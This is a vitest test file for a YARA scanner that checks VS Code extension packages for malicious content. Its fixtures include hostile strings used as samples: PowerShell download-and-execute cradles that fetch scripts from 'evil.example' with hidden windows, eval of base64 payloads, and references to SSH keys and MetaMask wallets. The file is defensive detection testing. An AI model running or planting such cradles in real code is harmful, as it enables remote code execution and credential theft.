import { describe, expect, it } from "vitest";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import type { VsixContents, VsixManifest } from "../types.js";
import { checkYara, isYaraAvailable, listYaraRules } from "./yara.js";

const __dirname = dirname(fileURLToPath(import.meta.url));
const ZOO_YARA_DIR = join(__dirname, "..", "..", "..", "zoo", "signatures", "yara");

function makeContents(files: Record<string, string>): VsixContents {
  const manifest: VsixManifest = {
    name: "test-extension",
    publisher: "test",
    version: "1.0.0",
  };

  const fileMap = new Map<string, Buffer>();
  for (const [name, content] of Object.entries(files)) {
    fileMap.set(name, Buffer.from(content, "utf8"));
  }

  return { manifest, files: fileMap, basePath: "/test" };
}

describe("isYaraAvailable", () => {
  it("returns boolean indicating YARA installation status", async () => {
    const result = await isYaraAvailable();

    // This will be true if yara is installed, false otherwise
    expect(typeof result).toBe("boolean");
  });
});

describe("listYaraRules", () => {
  it("lists YARA rule files in zoo directory", async () => {
    const rules = await listYaraRules(ZOO_YARA_DIR);

    // We should have some YARA rules in the zoo
    expect(Array.isArray(rules)).toBe(true);
    // All files should have .yar or .yara extension
    expect(rules.every((r) => r.endsWith(".yar") || r.endsWith(".yara"))).toBe(true);
  });

  it("returns empty array for non-existent directory", async () => {
    const rules = await listYaraRules("/nonexistent/path");

    expect(rules).toEqual([]);
  });
});

describe("checkYara", () => {
  it("returns appropriate result based on YARA availability", async () => {
    const available = await isYaraAvailable();
    const contents = makeContents({ "test.js": "console.log('test');" });
    const findings = await checkYara(contents);

    if (!available) {
      // When YARA is not installed, should return informational finding
      expect(findings).toHaveLength(1);
      expect(findings.some((f) => f.id === "YARA_NOT_INSTALLED")).toBe(true);
      expect(findings.some((f) => f.severity === "low")).toBe(true);
      const finding = findings.find((f) => f.id === "YARA_NOT_INSTALLED");
      expect(finding?.metadata?.["suggestion"]).toBe("brew install yara-x");
    } else {
      // When YARA is installed, should return scan results (possibly empty)
      expect(Array.isArray(findings)).toBe(true);
    }
  });

  it("returns empty findings for clean extension when YARA is available", async () => {
    const available = await isYaraAvailable();
    if (!available) return; // Skip if YARA not installed

    const contents = makeContents({
      "extension.js": "console.log('Hello, World!');",
      "package.json": JSON.stringify({ name: "test", version: "1.0.0" }),
    });

    const findings = await checkYara(contents);

    // Should not match any YARA rules for clean code
    const yaraMatches = findings.filter(
      (f) => f.id.startsWith("YARA_") && f.id !== "YARA_NOT_INSTALLED",
    );
    expect(yaraMatches).toHaveLength(0);
  });

  it("handles extension with potentially suspicious content", async () => {
    const available = await isYaraAvailable();
    if (!available) return; // Skip if YARA not installed

    // Create content that might match YARA rules
    // This includes variation selectors (U+FE00-FE0F) and eval
    const suspiciousContent = `
      const payload = "test\uFE01\uFE02\uFE03";
      eval(atob(payload));
    `;

    const contents = makeContents({
      "extension.js": suspiciousContent,
    });

    const findings = await checkYara(contents);

    // Should return array of findings (might match rules depending on rule content)
    expect(Array.isArray(findings)).toBe(true);
  });

  it("includes metadata when rules match", async () => {
    const available = await isYaraAvailable();
    if (!available) return; // Skip if YARA not installed

    const contents = makeContents({
      "extension.js": `
        const wallet = "metamask";
        const key = ".ssh/id_rsa";
        eval(Buffer.from("Y29kZQ==", "base64").toString());
      `,
    });

    const findings = await checkYara(contents);

    // If any YARA rules matched, finding ID should include rule name
    for (const finding of findings) {
      if (finding.id !== "YARA_NOT_INSTALLED") {
        expect(finding.id).toMatch(/^YARA_/);
        expect(finding.metadata?.["rule"]).toBeDefined();
      }
    }
  });

  it("handles empty extension gracefully", async () => {
    const available = await isYaraAvailable();
    if (!available) return; // Skip if YARA not installed

    const contents = makeContents({});

    const findings = await checkYara(contents);

    // Should not throw and should return array
    expect(Array.isArray(findings)).toBe(true);
  });

  it("detects PowerShell hidden window pattern", async () => {
    const available = await isYaraAvailable();
    if (!available) return;

    // Content that matches SUSP_PS_Hidden_Window_Jan25:
    // requires "powershell" AND "-WindowStyle Hidden"
    const maliciousContent = [
      'const cmd = "powershell -WindowStyle Hidden',
      " -Command irm https://evil.example/payload.ps1",
      ' | iex";',
      "require('child_process').exec(cmd);",
    ].join("");

    const contents = makeContents({
      "extension.js": maliciousContent,
    });

    const findings = await checkYara(contents);

    const psFindings = findings.filter((f) => f.id === "YARA_SUSP_PS_Hidden_Window_Jan25");
    expect(psFindings).toHaveLength(1);
    expect(psFindings[0]?.severity).toBe("critical");
    expect(psFindings[0]?.metadata?.["ruleFile"]).toBe("powershell_attacks.yar");
  });

  it("detects PowerShell download-execute cradle", async () => {
    const available = await isYaraAvailable();
    if (!available) return;

    // Content that matches LOADER_PS_Download_Execute_Jan25:
    // requires PowerShell context + IEX pipe pattern
    const maliciousContent = [
      "const script = `powershell -Command ",
      '"irm https://evil.example/stage2.ps1 | iex"`;',
    ].join("");

    const contents = makeContents({
      "activate.js": maliciousContent,
    });

    const findings = await checkYara(contents);

    const loaderFindings = findings.filter((f) => f.id === "YARA_LOADER_PS_Download_Execute_Jan25");
    expect(loaderFindings).toHaveLength(1);
    expect(loaderFindings[0]?.severity).toBe("critical");
  });
});
